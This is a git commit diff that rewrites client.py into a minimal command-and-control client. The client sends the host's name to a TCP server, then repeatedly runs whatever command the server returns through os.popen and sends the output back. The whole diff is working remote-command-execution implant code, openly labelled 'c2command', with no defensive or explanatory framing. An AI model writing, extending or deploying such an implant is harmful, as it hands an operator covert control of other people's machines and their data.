47b2a82b3b5c7d7c2cd8a3d61b074e0fe76a2981
Daxton Wirth <66894542+daxtonwirth@users.noreply.github.com>
2022-09-20 05:04:47 +0900

    Update client.py

--- client.py
+++ client.py
@@ -1,14 +1,25 @@
-import sys
+import socket
+import time
 import os
 
+HOST, PORT = "localhost", 9999
+#data = " ".join(sys.argv[1:])
+data = os.popen('echo $($env:ComputerName)').read()
 
-Class Listener:
-   def __init__(self, name, port, ipaddress):
-        
-        self.name       = name
-        self.port       = port
-        self.ipaddress  = ipaddress
+while(True):
 
-if __name__ == "__main__":
-    main()
-    
+    # Create a socket (SOCK_STREAM means a TCP socket)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        # Connect to server and send data
+        sock.connect((HOST, PORT))
+        sock.sendall(bytes(data + "\n", "utf-8"))
+
+        # Receive data from the server and shut down
+        received = str(sock.recv(2048), "utf-8")
+
+        c2command = os.popen(received).read()
+        sock.sendall(bytes(c2command + "\n", "utf-8"))
+
+        # run forever until command received to stop
+        time.sleep(5)
+
